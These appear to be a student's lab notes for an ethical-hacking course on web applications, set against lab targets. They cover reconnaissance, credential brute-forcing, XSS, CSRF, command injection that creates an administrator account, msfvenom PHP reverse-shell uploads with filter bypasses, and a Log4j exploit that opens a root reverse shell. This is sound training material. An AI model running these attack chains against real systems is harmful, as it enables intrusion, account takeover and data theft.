# Lab 1: Footprint the Web Infrastructure
**Overview of Footprinting the Web Infrastructure**

Footprinting the web infrastructure allows attackers to engage in the following tasks:

- **Server Discovery**: Attackers attempt to discover the physical servers that host a web application using techniques such as Whois Lookup, DNS Interrogation, and Port Scanning
- **Service Discovery**: Attackers discover services running on web servers to determine whether they can use some of them as attack paths for hacking a web app
- **Server Identification**: Attackers use banner-grabbing to obtain server banners; this helps to identify the make and version of the web server software
- **Hidden Content Discovery**: Footprinting also allows attackers to extract content and functionality that is not directly linked to or reachable from the main visible content
## Task 1: Perform Web Application Reconnaissance using Nmap and Telnet
Whois lookup to gather information about the IP address of the web server and the complete information about the domain such as its registration details, name servers, IP address, and location.
 1. Use tools such as **Netcraft** (https://www.netcraft.com), **SmartWhois** (https://www.tamos.com), **WHOIS Lookup** (https://whois.domaintools.com), and **Batch** **IP Converter** (http://www.sabsoft.com) to perform the Whois lookup.

2. Perform DNS Interrogation to gather information about the DNS servers, DNS records, and types of servers used by the target organization. DNS zone data include DNS domain names, computer names, IP addresses, domain mail servers, service records, etc.

3. Use tools such as, **DNSRecon** (https://github.com), and **DNS Records** (https://network-tools.com), **Domain Dossier** (https://centralops.net) to perform DNS interrogation.

   	[parrot]
   	nmap -T4 -A -v www.moviescope.com
   	Target machine name, NetBIOS name, DNS name, MAC address, OS, and other information is displayed.

   	perform banner grabbing to identify the make, model, and version of the target web server software.
   	
   	telnet www.moviescope.com 80
   	the server is identified as Microsoft-IIS/10.0 and the technology used is ASP.NET

   	If the attacker entered an IP address, they receive the banner information of the target machine; if they enter the URL of a website, they receive the banner 
   	information of the respective web server that hosts the website.
---
## Task 2: Perform Web Application Reconnaissance using WhatWeb

	[parrot]
	whatweb www.moviescope.com
	whatweb -v www.moviescope.com -> verbose
	whatweb --log-verbose=Report www.moviescope.com -> /home/sbparrot/Report file will be generated
	pluma Report
---
## Task 3: Perform Web Spidering using OWASP ZAP

	[parrot]
	sudo su -> cd
	zapproxy
	QuickStart -> Automated Scan -> URL to attack www.moviescope.com
	Spider tab -> messages
	Active Scan
	Alerts
---
## Task 4: Detect Load Balancers using Various Tools

DNS load balancers (Layer 4 load balancers) and
http load balancers (layer 7 load balancers).
detect load balancers using dig command and lbd tool.

	[parrot]
	sudo su
	cd
	dig yahoo.com
	lbd yahoo.com
---
## Task 5: Identify Web Server Directories using Various Tools

The target web application’s files and directories exposed on the Internet using various automated tools such as Nmap Gobuster and Dirsearch.

	[parrot]
	sudo su
	cd
	nmap -sV --script=http-enum www.moviescope.com ->displaying open ports and services, along with their version.
	Scroll-down in the result and observe the identified web server directories under the http-enum section
	Copy wordlist common.txt to Desktop
	
	gobuster dir -u www.moviescope.com -w /home/attacker/Desktop/common.txt

uses Gobuster to scan the target website for web server directories and perform fast-paced enumeration of the hidden files and directories of the target web application. Gobuster is a command-oriented tool used to brute-force URIs in websites, DNS subdomains, and names of the virtual hosts on the target server.

	sudo su
	cd dirsearch/
	python3 dirsearch.py -u http://www.moviescope.com -> Dir bruteforcing
	
	perform directory bruteforcing on a specific file extension.
	python3 dirsearch.py -u http://www.moviescope.com -e aspx
	-e -> extension of file

	perform directory bruteforcing by excluding the status code 403.
	python3 dirsearch.py -u http://www.moviescope.com -x 403  -> dirsearch lists the directories from the target website excluding 403 status code.
	-x -> exclude status code
---
## Task 6: Perform Web Application Vulnerability Scanning using Vega

Win11 - host
Win server 22 - victim - dvwa is hosted on win 22

	[Win server 22]
	Launch wamp -> wampserver64 -> show hidden icon - let it turn green. make sure wampserver is running.
	
	[Win 11]
	Launch Vega -> Run as an admin
	Scan -> Start new scan
	Enter a base URI for scan radio button is selected under the Scan Target section.
	Enter http://10.10.1.22:8080/dvwa
	The Select Modules wizard appears; double-click on both of the checkboxes (Injection Modules and Response Processing Modules) to select all options.
	In the Authentication Options wizard, leave the settings to default and click Next.
	Parameters wizard, leave the settings to default and click Finish to initiate the scan.
	Follow Redirect? pop-up appears; click Yes to continue.
	After the scanner finishes performing its vulnerability assessment on the target website, it lists the discovered vulnerabilities under Scan Alert Summary.
	
	
	You can also use other web application vulnerability scanning tools such as 
	WPScan Vulnerability Database (https://wpscan.com), 
	Arachni (https://www.arachni-scanner.com), 
	appspider (https://www.rapid7.com), or 
	Uniscan (https://sourceforge.net) to discover vulnerabilities in the target website.
---
## Task 7: Identify Clickjacking Vulnerability using ClickjackPoc

	[parrot]
	sudo su
	cd ClickjackPoc/
	echo "http://www.moviescope.com"	|tee domain.txt    ->create a file named domain.txt containing the website link.
	python3 clickJackPoc.py -f domain.txt
	Under ClickjackPoc folder -> right click www.moview.com.html -> open with firefox
---
# Lab 2: Perform Web Application Attacks

Parrot - host
Win server 22 - victim - hosted wordpress website

	[Win server 22]
	wampserver running

	[parrot]
	http://10.10.1.22:8080/CEH/wp-login.php? -> open in firefox browser
	
	setup burp proxy
	Open Menu - preferences - General - find proxy
	Setting - N/w settings - Conn setting - Manual proxy configuration - proxy 127.0.0.1 and port 8080, Tick the Also use this proxy for FTP and HTTPS checkbox and 
	click OK
	
	Launch Burpsuite
	Proxy - Interceptor is on 

	admin/password - login to worpress site
	Intercept port request -> right click and send it to Intruder
	Intruder tab -> Target tab - Host: 10.10.1.22 & port 8080
	Clear 
	Attack type- Cluster bomb
	we will set the username and password as the payload values. To do so, select the username value entered in Step 16 and click Add § from the right-pane.
	Navigate to the Payloads tab under the Intruder tab and ensure that under the Payload Sets section, the Payload set is selected as 1, and the Payload type is selected as Simple list.
	Under the Payload Options [Simple list] section, click the Load… button.
	select the /Wordlist/username.txt file,
	
	load a password file -select the Payload set as 2 from the drop-down options and ensure that the Payload type is selected as Simple list
	Load Wordlist, select the password.txt 
	
	Start attack
	It displays various username-password combinations along with the Length of the response and the Status.
	
	Note: Different values of Status and Length indicate that the combination of the respective credentials is successful.
	In the Raw tab under the Request tab, the HTTP request with a set of the correct credentials is displayed. (here, username=admin and password=qwerty@123),
	
	Off the proxy
	Reload website with found credentials
---
## Task 2: Perform Parameter Tampering using Burp Suite

Modifyfy query param for the request

---
## Task 3: Identify XSS Vulnerabilities in Web Applications using PwnXSS

PwnXSS tool to scan the target website for cross-site scripting (XSS)

	[parrot]
	sudo su
	cd PwnXSS
	python3 pwnxss.py -u http://testphp.vulnweb.com

	Copy any Query (GET) link under Detected XSS section from the terminal window.
	past copied link in firefox browser -> popup appears
---
## Task 4: Exploit Parameter Tampering and XSS Vulnerabilities in Web Applications

	[Win 11]
	http://www.moviescope.com 
	sam/test
	Profile -> modify id=1 to 2/3 -> see the profile is shown of others
	
	Contacts
	Form
	Name: xxx
	comment: <script>hello</script>
	Submit -> alert displays
	
	[Win server 22]
	http://www.moviescope.com
	Access contacts ->you would see the alert
---------
## Task 5: Perform Cross-site Request Forgery (CSRF) Attack

The inability of web applications to differentiate a request made using malicious code from a genuine request exposes it to the CSRF attack. These attacks exploit web page vulnerabilities that allow an attacker to force an unsuspecting user’s browser to send malicious requests that they did not intend.

target  - win server 22 - wordpress site hosted (http://10.10.1.22/CEH)
host - parrot

	[Win server 22]
	Launch wampserver
	Launch http://10.10.1.22:8080/CEH/wp-login.php?
	admin/qwerty
	Plugins - installed plugins - leenk.me - activate
	LHP - leenk.me - general setting - Tick Facebook - save
	Choose which social network modules you want to enable for this site option and click the Facebook Settings hyperlink.
	
	[parrot]
	https://wpscan.com/register
Register - activate account - get api token

	[parrot]
	sudo su
	cd
	wpscan --api-token [API Token from above steps] --url http://10.10.1.22:8080/CEH --plugins-detection aggressive --enumerate vp
	--enumerate vp: specifies the enumeration of vulnerable plugins.
	
	we will exploit the CSRF vulnerability present in the leenkme plugin.
	Copy Security_Script.html file from Desktop to shared folder
	
	Click the Places menu at the top of Desktop and click Network from the drop-down options.
	Ctrl + L
	smb://10.10.1.11
	Admin/Pa$$w0rd Connect & paste Security_Script.html in shared folder
		
	[Win server 22]
	Copy to Desktop Security_Script.html
	Security_Script.html file opens up in the Mozilla Firefox browser, along with a pop-up; click OK to continue.
	You will be redirected to the Facebook Settings page of the leenk.me plugin page. Observe that the field values have been changed, indicating a successful CSRF 
	attack on the website, as shown in the screenshot.
---
## Task 6: Enumerate and Hack a Web Application using WPScan and Metasploit

	[Win server 22]
	Launch wampserver
	
	[parrot]
	sudo su
	cd
	wpscan --api-token [API Token] --url http://10.10.1.22:8080/CEH --enumerate u
	--enumerate u: specifies the enumeration of usernames.
	
	Note:Here, we will use the API token that we obtained by registering with the https://wpscan.com/register website.
	Now that you have successfully obtained the usernames stored in the database, you need to find their passwords.
	
	To obtain the passwords, you will use the auxiliary module called wordpress_login_enum (in msfconsole) to perform a dictionary attack using the password.txt file 
	(in the Wordlist folder) which you copied to the location /home/attacker/Desktop/CEHv12 Module 14 Hacking Web Applications.
	
	service postgresql start -> first start the PostgreSQL service.
	msfconsole
	use auxiliary/scanner/http/wordpress_login_enum 
	show options
	set PASS_FILE /home/attacker/Desktop/CEHv12 Module 14 Hacking Web Applications/Wordlist/password.txt 
	set RHOSTS 10.10.1.22
	set RPORT 8080
	set TARGETURI http://10.10.1.22:8080/CEH 
	set USERNAME admin -> take any username obtained from above
	run
	
	 the cracked password is qwerty@123
	
	 http://10.10.1.2022:8080/CEH/wp-login.php -> login with found credentials

---
## Task 7: Exploit a Remote Command Execution Vulnerability to Compromise a Target Web Server

In this task, we will perform command-line execution on a vulnerability found in DVWA. Here, you will learn how to extract information about a target machine, create a user account, assign administrative privileges to the created account, and use that account to log in to the target machine.

	[Win 11]
	http://10.10.1.22:8080/dvwa/login.php
	gordonb/abc123
	
	Command Injection
	Ping a device - 10.10.1.22 -> successfully pings the target machine
	
	| hostname -> error
	Set security level to low
	
	| hostname 			-> return machine name   -> This infers that the command execution field is vulnerable and that you can remotely execute commands.
	| whoami
	| tasklist 			-> to view the processes running on the machine.
	
	To check if you can terminate a process, choose any process from the list (here, Microsoft.ActiveDirectory), and note down its process PID (here, 3112).
	| Taskkill /3112 /F
	
	/F- Forecefully terminate
	
	| dir C:\ 			-> files and directories on C:\
	| net user  		-> User account information
	
	Attempt to add a user account remotely.
	
	| net user Test /Add
	| net user 			-> View the new user account
	| net user Test 	-> new account information
	
	Does not have administrative privileges. It has an entry called Local Group Memberships.
	
	| net localgroup Administrators Test/Add  -> To grant administrative privileges
	| net user Test     -> Test is now an administrator account under the Local Group Memberships option.
		
	cmd>Search Remote (RDC)
	10.10.1.22 - Show options
	Username: test - connect
---
## Task 8: Exploit a File Upload Vulnerability at Different Security Levels
Meterpreter is a Metasploit attack payload that provides an interactive shell that can be used to explore the target machine and execute code.

	[win server 22]
	launch wampserver
	
	[parrot]
	sudo su
	cd
	msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=444 -f raw
	The raw payload is generated in the terminal window. Select the payload, right-click on it, and click Copy from the context menu to copy the payload.
	cd /home/attacker/Desktop/
	pluma upload.php, Save the copied content.
	
	Open http://10.10.1.22/dvwa/login.php
	admin/password
	security - low
	File upload - upload the upload.php.
	
	[parrot]
	sudo su
	cd
	msfconsole
	use exploit/multi/handler
	set payload php/meterpreter/reverse_tcp
	set LHOST 10.10.1.13
	set LPORT 444
	run
	Minimize window
	
	Firefox
	Open http://10.10.1.22:8080/dvwa/hackable/uploads/upload.php
	
	Terminal - Meterpreter session has successfully been established with the victim system
	sysinfo
	--------------------------------------
	[parrot]
	sudo su
	cd
	msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=3333 -f raw  -> copy the raw content
	cd /home/attacker/Desktop
	pluma medium.php.jpeg
	paste the raw content and save
	
	Firefox
	http://10.10.1.22:8080/dvwa/login.php
	admin/password
	Change security from Impossible to Medium
	File Upload - select medium file and upload it - b4 Clicking Upload setup Burpproxy - Set proxy first
	Open BurpSuite - Interceptor is On
	
	Click Upload button 
	Change teh filename from medium.php.jpg to medium.php + click forward + Interceptor off
	Remove proxy
	
	Terminal
	sudo su
	cd
	msfconsole
	use exploit/multi/handler -> setting up listener
	set payload php/meterpreter/reverse_tcp
	set LHOST 10.10.1.13
	set LPORT 333
	run
	
	Firefox: http://10.10.1.22:8080/dvwa/hackable/uploads/medium.php
	
	Terminal - Meterpreter session has successfully been established with the victim system
	sysinfo
	--------------------------------------
	[parrot]
	sudo su
	cd
	msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=2222 -f raw  -> copy the raw content
	cd /home/attacker/Desktop
	pluma high.jpeg
	paste the raw content and save
	
	Firefox
	http://10.10.1.22:8080/dvwa/login.php
	admin/password
	Change security from Impossible to High
	File Upload - select high.jpeg file and upload it, note down the location of the uploaded file
	
	
	Command Injection
	Ip address: |copy C:\wamp64\www\DVWA\hackable\uploads\high.jpeg C:\wamp64\www\DVWA\hackable\uploads\shell.php + Submit
	
	Terminal
	sudo su
	cd
	msfconsole
	use exploit/multi/handler
	set payload php/meterpreter/reverse_tcp
	set LHOST 10.10.1.13
	set LPORT 2222
	run 
	
	Firefox: http://10.10.1.22:8080/dvwa/hackable/uploads/shell.php
	Terminal: Meterpreter session has successfully been established with the victim system.
	sysinfo
	file upload vulnerability at different security levels.
-------
## Task 9: Gain Access by Exploiting Log4j Vulnerability

	[ubuntu]
	sudo apt-get update
	sudo apt-get install docker.io
	cd log4j-shell-poc/
	docker build -t log4j-shell-poc    -> setup log4j vulnerable server
	 -t: specifies allocating a pseudo-tty.
	docker run --network host log4j-shell-poc
	
	
	[parrot]
	Firefox
	http://10.10.1.9:8080
	
	Terminal-1
	sudo su
	cd log4j-shell-poc
	
	new terminal -2 - setup java
	sudo su
	tar -xf jdk-8u202-linux-x64.tar.gz 
	mv jdk1.8.0_202 /usr/bin
	
	To update the installed JDK path in the poc.py file.
	
	1st Terminal - /home/attacker/log4j-shell-poc
	pluma poc.py
	replace jdk1.8.0_20/bin/javac with /usr/bin/jdk1.8.0_202/bin/javac - 62
	replace jdk1.8.0_20/bin/java with /usr/bin/jdk1.8.0_202/bin/java - 87 & 99
	
	New terminal-3
	nc -lvp 9001  -> to initiate a netcat listener 
	
	1st Terminal - /home/attacker/log4j-shell-poc
	python3 poc.py --userip 10.10.1.13 --webport 8000 --lport 9001
	copy the payload generated in the send me: section.
	
	Firefox: paste teh paylod in username field - while accessing http://10.10.1.9:8080 
	password: password
	
	nc lister:
	see that a reverse shell is opened.
	pwd -> to view present working dir
	whoami
	
	We can see that we have shell access to the target web application as a root user.
	
	The Log4j vulnerability takes the payload as input and processes it, as a result we will obtain a reverse shell.
---
# Lab 3: Detect Web Application Vulnerabilities using Various Web Application Security Tools
